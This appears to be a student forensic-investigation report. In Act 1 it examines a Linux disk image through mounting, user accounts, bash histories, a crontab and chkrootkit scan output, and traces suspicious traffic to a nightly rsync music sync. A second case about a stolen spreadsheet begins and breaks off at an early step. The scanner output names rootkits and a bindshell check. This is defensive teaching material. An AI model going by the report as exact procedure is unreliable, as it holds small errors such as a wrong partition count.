<h4 id="orgb71386f"><span class="section-number-4">3.2.1</span> Download image</h4>
<div class="outline-text-4" id="text-3-2-1">
<p>
Download the act1 assignemnt and check SHA hash.
</p>

<p>
Commands:
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #DCDCCC; font-weight: bold;">cd</span> /images
sudo ./loadimage.sh act1.img
sha256sum act1.img
</pre>
</div>

<p>
Results:
</p>

<div class="org-src-container">
<pre class="src src-org">Loading image. Please wait...
Decompressing image. Please wait...
Done.
cfea531176f4f2c5aa0adff18d93bacb9ec6f0d5edc572bb5719db79f7aaa4a5  act1.img
</pre>
</div>
</div>
</div>

<div id="outline-container-org5fb4442" class="outline-4">
<h4 id="org5fb4442"><span class="section-number-4">3.2.2</span> Examin the image.</h4>
<div class="outline-text-4" id="text-3-2-2">
<p>
Examin the <code>/images/sda1</code> image that was loaded. The reason to do
this is to verify the offsetsto the partitions.
</p>

<p>
Commands:
</p>

<div class="org-src-container">
<pre class="src src-sh">file /images/act1.img
fdisk -lu /images/act1.img
</pre>
</div>

<p>
Results:
</p>

<div class="org-src-container">
<pre class="src src-org">/images/act1.img: x86 boot sector; GRand Unified Bootloader, stage1
version 0x3, stage2 address 0x2000, stage2 segment 0x200; partition 1:
ID=0x83, active, starthead 1, startsector 63, 3887667 sectors;
partition 2: ID=0x5, starthead 0, startsector 3887730, 305235 sectors,
code offset 0x48

Disk /images/act1.img: 0 MB, 0 bytes
255 heads, 63 sectors/track, 0 cylinders, total 0 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk identifier: 0x00078752

           Device Boot      Start         End      Blocks   Id  System
/images/act1.img1   *          63     3887729     1943833+  83  Linux
/images/act1.img2         3887730     4192964      152617+   5  Extended
/images/act1.img5         3887793     4192964      152586   82  Linux swap / Solaris
</pre>
</div>

<p>
Here is a table with the offsets that is found on the disk.  We can
see that there is three paritions on the disk.
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-right" />

<col  class="org-right" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Parition</th>
<th scope="col" class="org-right">Start</th>
<th scope="col" class="org-right">Offset</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">act1.img1</td>
<td class="org-right">63</td>
<td class="org-right">32256</td>
</tr>

<tr>
<td class="org-left">act1.img2</td>
<td class="org-right">3887730</td>
<td class="org-right">1990517760</td>
</tr>

<tr>
<td class="org-left">act1.img5</td>
<td class="org-right">3887793</td>
<td class="org-right">1990550016</td>
</tr>
</tbody>
</table>
</div>
</div>

<div id="outline-container-orgaee5839" class="outline-4">
<h4 id="orgaee5839"><span class="section-number-4">3.2.3</span> Mount a loop image.</h4>
<div class="outline-text-4" id="text-3-2-3">
<p>
Mount the first &ldquo;loop0&rdquo; to <code>/images/sda1</code>, this is the file system
to examin.  This disk should be the root disk where users and
systems is. The partition is mounted as read only.
</p>

<p>
Commands:
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo losetup /dev/loop0 /images/act1.img -o 32256
sudo mount /dev/loop0 /images/sda1 -t ext2 -o ro
df -Th | grep /images/sda1
ls -la /images/sda1
</pre>
</div>

<p>
Results:
</p>

<div class="org-src-container">
<pre class="src src-org">/dev/loop0    ext2    1.9G  1.4G  407M  78% /images/sda1
total 104
drwxr-xr-x 21 root root  4096 2010-01-04 08:55 .
drwxr-xr-x  6 root root  4096 2007-09-15 11:34 ..
drwxr-xr-x  2 root root  4096 2009-09-12 19:03 bin
drwxr-xr-x  3 root root  4096 2009-09-12 19:12 boot
lrwxrwxrwx  1 root root    11 2009-09-12 18:34 cdrom -&gt; media/cdrom
drwxr-xr-x  4 root root  4096 2009-09-12 18:44 dev
drwxr-xr-x 82 root root  4096 2010-01-04 09:00 etc
drwxr-xr-x  7 root root  4096 2010-01-04 08:55 home
lrwxrwxrwx  1 root root    33 2009-09-12 18:48 initrd.img -&gt; boot/initrd.img-2.6.28-15-generic
drwxr-xr-x 17 root root 12288 2009-12-23 19:28 lib
drwx------  2 root root 16384 2009-09-12 18:34 lost+found
drwxr-xr-x  4 root root  4096 2009-09-12 18:34 media
drwxr-xr-x  2 root root  4096 2009-04-13 02:33 mnt
drwxr-xr-x  2 root root  4096 2009-09-12 18:42 opt
drwxr-xr-x  2 root root  4096 2009-04-13 02:33 proc
drwx------  3 root root  4096 2010-01-04 09:42 root
drwxr-xr-x  2 root root  4096 2009-12-23 19:28 sbin
drwxr-xr-x  2 root root  4096 2009-03-06 08:21 selinux
drwxr-xr-x  2 root root  4096 2009-09-12 18:42 srv
drwxr-xr-x  2 root root  4096 2009-03-31 02:02 sys
drwxrwxrwt  4 root root  4096 2010-01-04 08:58 tmp
drwxr-xr-x 11 root root  4096 2009-09-12 19:01 usr
drwxr-xr-x 15 root root  4096 2009-09-12 19:03 var
lrwxrwxrwx  1 root root    30 2009-09-12 18:48 vmlinuz -&gt; boot/vmlinuz-2.6.28-15-generic
</pre>
</div>
</div>
</div>

<div id="outline-container-orgb8f4f2f" class="outline-4">
<h4 id="orgb8f4f2f"><span class="section-number-4">3.2.4</span> Get operating system</h4>
<div class="outline-text-4" id="text-3-2-4">
<p>
What operating system are the examining host running.
</p>

<p>
Commands:
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo cat /images/sda1/etc/lsb-release
</pre>
</div>

<p>
Results:
</p>

<div class="org-src-container">
<pre class="src src-org">DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=9.04
DISTRIB_CODENAME=jaunty
DISTRIB_DESCRIPTION="Ubuntu 9.04"
</pre>
</div>
</div>
</div>

<div id="outline-container-org64b45c7" class="outline-4">
<h4 id="org64b45c7"><span class="section-number-4">3.2.5</span> Get time zone</h4>
<div class="outline-text-4" id="text-3-2-5">
<p>
What time zone was configured to the host.
</p>

<p>
Commands:
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo cat /images/sda1/etc/timezone
</pre>
</div>

<p>
Results:
</p>

<div class="org-src-container">
<pre class="src src-org">America/Los_Angeles
</pre>
</div>
</div>
</div>

<div id="outline-container-orgff43266" class="outline-4">
<h4 id="orgff43266"><span class="section-number-4">3.2.6</span> Look for users</h4>
<div class="outline-text-4" id="text-3-2-6">
<p>
Bob told us that there is some accounts on the system.
&rsquo;bob&rsquo;, &rsquo;eric&rsquo;, &rsquo;kevin&rsquo;, &rsquo;peter&rsquo; and &rsquo;takeda&rsquo;.
</p>

<p>
Commands:
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #DCDCCC; font-weight: bold;">cd</span> /images/sda1
ls -la home/
</pre>
</div>

<p>
Results:
</p>

<div class="org-src-container">
<pre class="src src-org">total 28
drwxr-xr-x  7 root  root 4096 2010-01-04 08:55 .
drwxr-xr-x 21 root  root 4096 2010-01-04 08:55 ..
drwxr-xr-x  2 tuser 1000 4096 2010-01-04 09:00 bob
drwxr-xr-x  2  1004 1004 4096 2010-01-04 08:56 eric
drwxr-xr-x  5  1003 1003 4096 2010-01-04 08:56 kevin
drwxr-xr-x  2  1001 1001 4096 2010-01-04 08:55 peter
drwxr-xr-x  3  1002 1002 4096 2010-01-04 08:58 takeda
</pre>
</div>


<p>
Looks like all of them are there.
But <code>bob</code> have strange owner permissions. Who is <code>tuser</code>?
</p>

<p>
How about with <code>passwd</code>?
</p>

<p>
Commands:
</p>

<div class="org-src-container">
<pre class="src src-sh">cat /images/sda1/etc/passwd
</pre>
</div>

<p>
Results:
</p>

<div class="org-src-container">
<pre class="src src-org">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
<span style="color: #D0BF8F; text-decoration: underline;"><a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh</a></span>
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
<span style="color: #D0BF8F; text-decoration: underline;"><a href="irc:x:39:39:ircd:/var/run/ircd:/bin/sh">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</a></span>
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:102::/home/syslog:/bin/false
klog:x:102:103::/home/klog:/bin/false
mysql:x:103:105:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
messagebus:x:105:111::/var/run/dbus:/bin/false
landscape:x:106:65534::/var/lib/landscape:/bin/false
bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
peter:x:1001:1001::/home/peter:/bin/bash
takeda:x:1002:1002::/home/takeda:/bin/bash
kevin:x:1003:1003::/home/kevin:/bin/bash
eric:x:1004:1004::/home/eric:/bin/bash
</pre>
</div>

<p>
Look at the users home dirs.
</p>

<p>
Commands:
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo find /images/sda1/home -maxdepth 2 -name <span style="color: #CC9393;">"*"</span>
</pre>
</div>

<p>
Results:
</p>

<div class="org-src-container">
<pre class="src src-org">/images/sda1/home
<span style="font-style: italic;">/images/sda1/home/bob</span>
<span style="font-style: italic;">/images/sda1/home/bob/</span>.profile
<span style="font-style: italic;">/images/sda1/home/bob/</span>.bash_logout
<span style="font-style: italic;">/images/sda1/home/bob/</span>.bashrc
<span style="font-style: italic;">/images/sda1/home/bob/</span>.sudo_as_admin_successful
<span style="font-style: italic;">/images/sda1/home/bob/</span>.bash_history
<span style="font-style: italic;">/images/sda1/home/peter</span>
<span style="font-style: italic;">/images/sda1/home/peter/</span>.profile
<span style="font-style: italic;">/images/sda1/home/peter/</span>.bash_logout
<span style="font-style: italic;">/images/sda1/home/peter/</span>.bashrc
<span style="font-style: italic;">/images/sda1/home/takeda</span>
<span style="font-style: italic;">/images/sda1/home/takeda/</span>.profile
<span style="font-style: italic;">/images/sda1/home/takeda/</span>.bash_logout
<span style="font-style: italic;">/images/sda1/home/takeda/</span>.bashrc
<span style="font-style: italic;">/images/sda1/home/takeda/</span>.bash_history
/images/sda1/home/takeda/eggdrop
/images/sda1/home/takeda/eggdrop1.6.19+ctcpfix.tar.gz
<span style="font-style: italic;">/images/sda1/home/kevin</span>
<span style="font-style: italic;">/images/sda1/home/kevin/</span>.profile
<span style="font-style: italic;">/images/sda1/home/kevin/</span>.bash_logout
<span style="font-style: italic;">/images/sda1/home/kevin/</span>.bashrc
<span style="font-style: italic;">/images/sda1/home/kevin/music</span>
<span style="font-style: italic;">/images/sda1/home/kevin/</span>.bash_history
<span style="font-style: italic;">/images/sda1/home/kevin/</span>.ssh
/images/sda1/home/kevin/links
<span style="font-style: italic;">/images/sda1/home/eric</span>
<span style="font-style: italic;">/images/sda1/home/eric/</span>.profile
<span style="font-style: italic;">/images/sda1/home/eric/</span>.bash_logout
<span style="font-style: italic;">/images/sda1/home/eric/</span>.bashrc
<span style="font-style: italic;">/images/sda1/home/eric/</span>.bash_history
</pre>
</div>
</div>
</div>

<div id="outline-container-orgb376612" class="outline-4">
<h4 id="orgb376612"><span class="section-number-4">3.2.7</span> Users bash history</h4>
<div class="outline-text-4" id="text-3-2-7">
<p>
Look into their <code>.bash_history</code>
</p>
</div>

<ol class="org-ol">
<li><a id="org483bbdf"></a>Bob<br />
<div class="outline-text-5" id="text-3-2-7-1">
<p>
Commands:
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo cat /images/sda1/home/bob/.bash_history
</pre>
</div>

<p>
Results:
</p>

<div class="org-src-container">
<pre class="src src-org">sudo shutdown -h now
</pre>
</div>
</div>
</li>

<li><a id="org30fcd02"></a>Peter<br />
<div class="outline-text-5" id="text-3-2-7-2">
<p>
Have no bash history
</p>
</div>
</li>

<li><a id="org4a5210a"></a>Takeda<br />
<div class="outline-text-5" id="text-3-2-7-3">
<p>
Commands:
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo cat /images/sda1/home/takeda/.bash_history
</pre>
</div>

<p>
Results:
</p>

<div class="org-src-container">
<pre class="src src-org">uptime
uname -a
fgrep takeda /etc/passwd
ifconfig
irssi
logout
tar xzf eggdrop1.6.19+ctcpfix.tar.gz
cd eggdrop1.6.19
./configure
make config
make
make install
cd ..
find eggdrop1.6.19 -delete
logout
</pre>
</div>
</div>
</li>

<li><a id="org3ade63e"></a>Kevin<br />
<div class="outline-text-5" id="text-3-2-7-4">
<p>
<a id="org5c24c12"></a>
</p>

<p>
Commands:
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo cat /images/sda1/home/kevin/.bash_history
</pre>
</div>

<p>
Results:
</p>

<div class="org-src-container">
<pre class="src src-org">mkdir music
logout
w
id
ls -al
cd music
ls
cd ..
crontab -l
echo "0 4 * * * rsync -aq --del --rsh="ssh" -e "ssh -l kevin" "kevin.dynip.com:My_Music/" \
"~/music"" | crontab -
crontab -l
ps x
ssh-keygen
cat .ssh/id_rsa.pub
logout
mkdir links
cd links
find ../music -exec ln -s {} \;
ls
logout
cd links
ls -l
rm *.gif
ls -l
rm README
logout
</pre>
</div>

<p>
Commands:
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo cat /images/sda1/var/spool/cron/crontabs/kevin
</pre>
</div>

<p>
Results:
</p>

<div class="org-src-container">
<pre class="src src-org"><span style="color: #7F9F7F;"># DO NOT EDIT THIS FILE - edit the master and reinstall.</span>
<span style="color: #7F9F7F;"># (- installed on Mon Jan  4 08:56:07 2010)</span>
<span style="color: #7F9F7F;"># (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)</span>
0 4 * * * rsync -aq --del --rsh=ssh -e ssh -l kevin kevin.dynip.com:My_Music/ ~/music
</pre>
</div>
</div>
</li>

<li><a id="org217fce8"></a>Eric<br />
<div class="outline-text-5" id="text-3-2-7-5">
<p>
Commands:
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo cat /images/sda1/home/eric/.bash_history
</pre>
</div>

<p>
Results:
</p>

<div class="org-src-container">
<pre class="src src-org">mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
mutt
logout
</pre>
</div>
</div>
</li>
</ol>
</div>

<div id="outline-container-org73127e4" class="outline-4">
<h4 id="org73127e4"><span class="section-number-4">3.2.8</span> Look at Kevins music</h4>
<div class="outline-text-4" id="text-3-2-8">
<p>
<a id="org61e2763"></a>
</p>

<p>
Commands:
</p>

<div class="org-src-container">
<pre class="src src-sh">du -h /images/sda1/home/kevin/music
</pre>
</div>

<p>
Results:
</p>

<div class="org-src-container">
<pre class="src src-org">280M    /images/sda1/home/kevin/music
</pre>
</div>
</div>
</div>

<div id="outline-container-org849b9fa" class="outline-4">
<h4 id="org849b9fa"><span class="section-number-4">3.2.9</span> Look for log files</h4>
<div class="outline-text-4" id="text-3-2-9">
<p>
List log files
</p>

<p>
Commands:
</p>

<div class="org-src-container">
<pre class="src src-sh">ls -R /images/sda1/var/log | <span style="color: #CC9393;">\</span>
awk <span style="color: #CC9393;">'/:$/&amp;&amp;f{s=$0;f=0} /:$/&amp;&amp;!f{sub(/:$/,"");s=$0;f=1;next} NF&amp;&amp;f{ print s"/"$0 }'</span> | <span style="color: #CC9393;">\</span>
sort
</pre>
</div>
</div>
</div>

<div id="outline-container-orgdb07fa0" class="outline-4">
<h4 id="orgdb07fa0"><span class="section-number-4">3.2.10</span> Look for tmp files</h4>
<div class="outline-text-4" id="text-3-2-10">
<p>
Commands:
</p>

<div class="org-src-container">
<pre class="src src-sh">ls -la /images/sda1/tmp/
</pre>
</div>

<p>
Results:
</p>

<div class="org-src-container">
<pre class="src src-org">total 16
drwxrwxrwt  4 root root 4096 2010-01-04 08:58 .
drwxr-xr-x 21 root root 4096 2010-01-04 08:55 ..
drwxrwxrwt  2 root root 4096 2010-01-04 08:55 .ICE-unix
drwxrwxrwt  2 root root 4096 2010-01-04 08:55 .X11-unix
</pre>
</div>
</div>
</div>

<div id="outline-container-org38c019a" class="outline-4">
<h4 id="org38c019a"><span class="section-number-4">3.2.11</span> Check for rootkits</h4>
<div class="outline-text-4" id="text-3-2-11">
<p>
<a id="org156eea2"></a>
</p>

<p>
Commands:
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #DCDCCC; font-weight: bold;">cd</span> /images/chkrootkit-0.47
sudo ./chkrootkit -r /images/sda1/
</pre>
</div>

<p>
Results:
</p>

<div class="org-src-container">
<pre class="src src-org">ROOTDIR is `/images/sda1/'
Checking `amd'... not found
Checking `basename'... not infected
Checking `biff'... not found
Checking `chfn'... not infected
Checking `chsh'... not infected
Checking `cron'... not infected
Checking `crontab'... not infected
Checking `date'... not infected
Checking `du'... not infected
Checking `dirname'... not infected
Checking `echo'... not infected
Checking `egrep'... not infected
Checking `env'... not infected
Checking `find'... not infected
Checking `fingerd'... not found
Checking `gpm'... not found
Checking `grep'... not infected
Checking `hdparm'... not infected
Checking `su'... not infected
Checking `ifconfig'... not infected
Checking `inetd'... not infected
Checking `inetdconf'... not found
Checking `identd'... not found
Checking `init'... not infected
Checking `killall'... not infected
Checking `ldsopreload'... not infected
Checking `login'... not infected
Checking `ls'... not infected
Checking `lsof'... not infected
Checking `mail'... not found
Checking `mingetty'... not found
Checking `netstat'... not infected
Checking `named'... not found
Checking `passwd'... not infected
Checking `pidof'... not infected
Checking `pop2'... not found
Checking `pop3'... not found
Checking `ps'... not infected
Checking `pstree'... not infected
Checking `rpcinfo'... not infected
Checking `rlogind'... not found
Checking `rshd'... not found
Checking `slogin'... not infected
Checking `sendmail'... not found
Checking `sshd'... not infected
Checking `syslogd'... not infected
Checking `tar'... not infected
Checking `tcpd'... not infected
Checking `tcpdump'... not infected
Checking `top'... not infected
Checking `telnetd'... not found
Checking `timed'... not found
Checking `traceroute'... not found
Checking `vdir'... not infected
Checking `w'... not infected
Checking `write'... not infected
Checking `aliens'... no suspect files
Searching for sniffer's logs, it may take a while... nothing found
Searching for HiDrootkit's default dir... nothing found
Searching for t0rn's default files and dirs... nothing found
Searching for t0rn's v8 defaults... nothing found
Searching for Lion Worm default files and dirs... nothing found
Searching for RSHA's default files and dir... nothing found
Searching for RH-Sharpe's default files... nothing found
Searching for Ambient's rootkit (ark) default files and dirs... nothing found
Searching for suspicious files and dirs, it may take a while... nothing found
Searching for LPD Worm files and dirs... nothing found
Searching for Ramen Worm files and dirs... nothing found
Searching for Maniac files and dirs... nothing found
Searching for RK17 files and dirs... nothing found
Searching for Ducoci rootkit... nothing found
Searching for Adore Worm... nothing found
Searching for ShitC Worm... nothing found
Searching for Omega Worm... nothing found
Searching for Sadmind/IIS Worm... nothing found
Searching for MonKit... nothing found
Searching for Showtee... nothing found
Searching for OpticKit... nothing found
Searching for T.R.K... nothing found
Searching for Mithra... nothing found
Searching for OBSD rk v1... nothing found
Searching for LOC rootkit... nothing found
Searching for Romanian rootkit... nothing found
Searching for Suckit rootkit... nothing found
Searching for Volc rootkit... nothing found
Searching for Gold2 rootkit... nothing found
Searching for TC2 Worm default files and dirs... nothing found
Searching for Anonoying rootkit default files and dirs... nothing found
Searching for ZK rootkit default files and dirs... nothing found
Searching for ShKit rootkit default files and dirs... nothing found
Searching for AjaKit rootkit default files and dirs... nothing found
Searching for zaRwT rootkit default files and dirs... nothing found
Searching for Madalin rootkit default files... nothing found
Searching for Fu rootkit default files... nothing found
Searching for ESRK rootkit default files... nothing found
Searching for rootedoor... nothing found
Searching for ENYELKM rootkit default files... nothing found
Searching for anomalies in shell history files... nothing found
Checking `asp'... not infected
Checking `bindshell'... not tested
Checking `lkm'... chkproc: not tested
Checking `rexedcs'... not found
Checking `sniffer'... not tested
Checking `w55808'... not infected
Checking `wted'... chkwtmp: nothing deleted
Checking `scalper'... not infected
Checking `slapper'... not infected
Checking `z2'... chklastlog: nothing deleted
Checking `chkutmp'...  The tty of the following user process(es) were not found
 in /var/run/utmp !
! RUID          PID TTY    CMD
! lnuitsac     2883 pts/1  /bin/bash --noediting -i
chkutmp: nothing deleted
</pre>
</div>
</div>
</div>

<div id="outline-container-orgf5c375a" class="outline-4">
<h4 id="orgf5c375a"><span class="section-number-4">3.2.12</span> Search for deleted files on Ext2.</h4>
<div class="outline-text-4" id="text-3-2-12">
<p>
<a id="orgfecc1ef"></a>
</p>

<p>
Searching for deleted files on a Ext2 disk.
</p>

<p>
Commands:
</p>

<div class="org-src-container">
<pre class="src src-sh">yes | sudo e2undel -d /dev/loop0 -s /images/recovered -a -tw
</pre>
</div>

<p>
Results:
</p>

<div class="org-src-container">
<pre class="src src-org">e2undel 0.82
Trying to recover files on /dev/loop0, saving them on /images/recovered

/dev/loop0 opened for read-only access
/dev/loop0 was not cleanly unmounted.
Do you want wo continue (y/n)? 121680 inodes (85986 free)
485958 blocks of 4096 bytes (128401 free)
last mounted on Mon Jan  4 09:42:40 2010
no entries for /dev/loop0 in log file
searching for deleted inodes on /dev/loop0:
121680 inodes scanned, 0 deleted files found
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-orgf807809" class="outline-3">
<h3 id="orgf807809"><span class="section-number-3">3.3</span> Report findings</h3>
<div class="outline-text-3" id="text-3-3">
<p>
When looking at Kevins bash history I could find out that he had
created a crontab entry that will sync his music every night at 4
[<a href="#org5c24c12">3.2.7.4</a>]. By looking at the total size of Kevins music
folder it shows that he synced 280MB [<a href="#org61e2763">3.2.8</a>]. There was no
evidence on that a worm have entered the system. There was no
deleted files [<a href="#orgfecc1ef">3.2.12</a>] and <code>chkrootkit</code> could not find
anything [<a href="#org156eea2">3.2.11</a>].
</p>
</div>
</div>

<div id="outline-container-org07c7474" class="outline-3">
<h3 id="org07c7474"><span class="section-number-3">3.4</span> Conclusion</h3>
<div class="outline-text-3" id="text-3-4">
<p>
There was no worm in the system. The network traffic was generated
from Kevins music syncing.
</p>
</div>
</div>

<div id="outline-container-org813956e" class="outline-3">
<h3 id="org813956e"><span class="section-number-3">3.5</span> Glossary</h3>
<div class="outline-text-3" id="text-3-5">
<dl class="org-dl">
<dt>rsync</dt><dd>Application for syncronizing to files between computers.</dd>
</dl>
</div>
</div>
</div>

<div id="outline-container-orgad7bc65" class="outline-2">
<h2 id="orgad7bc65"><span class="section-number-2">4</span> Forensic Report Act 2: The Missing Numbers</h2>
<div class="outline-text-2" id="text-4">
</div>

<div id="outline-container-org682d380" class="outline-3">
<h3 id="org682d380"><span class="section-number-3">4.1</span> Executive summary</h3>
<div class="outline-text-3" id="text-4-1">
<p>
Your cousin Jimmy down at the precinct thought he&rsquo;d throw you a
bone so he sent you this case. It seems like a local punk broke into a
server at Yoyodyne Defense, stole a protected spreadsheet chock full
of secret numbers, and got caught trying to fence it to an undercover
cop for a pocketful of cryptocoins. He says he got the spreadsheet
&ldquo;from a friend&rdquo; but the story doesn&rsquo;t check out. The boys at the
station seized his computer with an outstanding warrant for &ldquo;Second
Degree Music Piracy&rdquo; but didn&rsquo;t find any evidence on it, so if they&rsquo;re
going to get him for more than &ldquo;Possession of Stolen Numbers,&rdquo; they
need reasonable proof that he actually did it.  Yoyodyne graciously
sent an ext2 disk image of the server that had the file on it for you
to examine. The only other thing they know is that the kid&rsquo;s IP
address at home was 207.92.30.41 at the time of the heist.
</p>

<p>
You may need to specify the filesystem type of the provided image in
order to mount it properly. See the instructions for mount for more
information.
</p>

<p>
Yhey know the file was stolen, but they need to know precisely how
and whether this kid is responsible. Finally, Yoyodyne wants your
professional recommendation as to what they need to do before
putting the server back into production.
</p>
</div>
</div>

<div id="outline-container-org6551d4d" class="outline-3">
<h3 id="org6551d4d"><span class="section-number-3">4.2</span> Methodology</h3>
<div class="outline-text-3" id="text-4-2">
</div>
<div id="outline-container-org4030a94" class="outline-4">
<h4 id="org4030a94"><span class="section-number-4">4.2.1</span> Download image</h4>
<div class="outline-text-4" id="text-4-2-1">
<p>
Download the act2 assignemnt and check SHA hash.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 1: </span>Commands</label><pre class="src src-sh"><span style="color: #DCDCCC; font-weight: bold;">cd</span> /images
sudo ./loadimage.sh act2.img
sha256sum act2.img
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 2: </span>Results</label><pre class="src src-text">Loading image. Please wait...
Decompressing image. Please wait...
Done.
bdde7d0202921cf82688904ad2662f2b15e9066855934ce9357b66405f25c565  act2.img
</pre>
</div>
</div>
</div>

<div id="outline-container-orge5040c6" class="outline-4">
<h4 id="orge5040c6"><span class="section-number-4">4.2.2</span> Examin the image.</h4>
<div class="outline-text-4" id="text-4-2-2">
<p>
Examin the <code>/images/sda1</code> image that was loaded. The reason to do
this is to verify the offsetsto the partitions.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 3: </span>Commands</label><pre class="src src-sh">file /images/act2.img
fdisk -lu /images/act2.img
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 4: </span>Results</label><pre class="src src-text">/images/act2.img: x86 boot sector, LInux i386 boot LOader; partition
1: ID=0x83, active, starthead 1, startsector 63, 2923767 sectors;
partition 2: ID=0x82, starthead 0, startsector 2923830, 979965
sectors, code offset 0xe8

Disk /images/act2.img: 0 MB, 0 bytes
255 heads, 63 sectors/track, 0 cylinders, total 0 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk identifier: 0xe43be43b

           Device Boot      Start         End      Blocks   Id  System
/images/act2.img1   *          63     2923829     1461883+  83  Linux
/images/act2.img2         2923830     3903794      489982+  82  Linux swap / Solaris
</pre>
</div>

<p>
Here is a table with the offsets that is found on the disk.  We can
see that there is three paritions on the disk.
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-right" />

<col  class="org-right" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Parition</th>
<th scope="col" class="org-right">Start</th>
<th scope="col" class="org-right">Offset</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">act2.img1</td>
<td class="org-right">63</td>
<td class="org-right">32256</td>
</tr>

<tr>
<td class="org-left">act2.img2</td>
<td class="org-right">2923830</td>
<td class="org-right">1497000960</td>
</tr>
</tbody>
</table>
</div>
</div>

<div id="outline-container-org205ef15" class="outline-4">
<h4 id="org205ef15"><span class="section-number-4">4.2.3</span> Mount a loop image.</h4>
<div class="outline-text-4" id="text-4-2-3">
<p>
Mount the first &ldquo;loop0&rdquo; to <code>/images/sda1</code>, this is the file system
to examin.  This disk should be the root disk where users and
systems is. The partition is mounted as read only.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 5: </span>Commands</label><pre class="src src-sh">sudo losetup /dev/loop0 /images/act2.img -o 32256
sudo mount /dev/loop0 /images/sda1 -t ext2 -o ro
df -Th | grep /images/sda1
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 6: </span>Results</label><pre class="src src-text">/dev/loop0    ext2    1.4G  179M  1.2G  14% /images/sda1
</pre>
</div>
</div>
</div>

<div id="outline-container-org168bbda" class="outline-4">
<h4 id="org168bbda"><span class="section-number-4">4.2.4</span> Get operating system</h4>
<div class="outline-text-4" id="text-4-2-4">
<p>
What operating system are the examining host running.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 7: </span>Commands</label><pre class="src src-sh">cat /images/sda1/etc/issue
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 8: </span>Results</label><pre class="src src-text">Debian GNU/\s 3.0 \n \l
</pre>
</div>
</div>
</div>

<div id="outline-container-org1433d7e" class="outline-4">
<h4 id="org1433d7e"><span class="section-number-4">4.2.5</span> Get time zone</h4>
<div class="outline-text-4" id="text-4-2-5">
<p>
What time zone was configured to the host.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 9: </span>Commands</label><pre class="src src-sh">sudo cat /images/sda1/etc/timezone
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 10: </span>Results</label><pre class="src src-text">America/Los_Angeles
</pre>
</div>
</div>
</div>

<div id="outline-container-orgde2df65" class="outline-4">
<h4 id="orgde2df65"><span class="section-number-4">4.2.6</span> Look at /</h4>
<div class="outline-text-4" id="text-4-2-6">
<p>
Look at the root directory of the mounted system.
</p>

<div class="org-src-container">
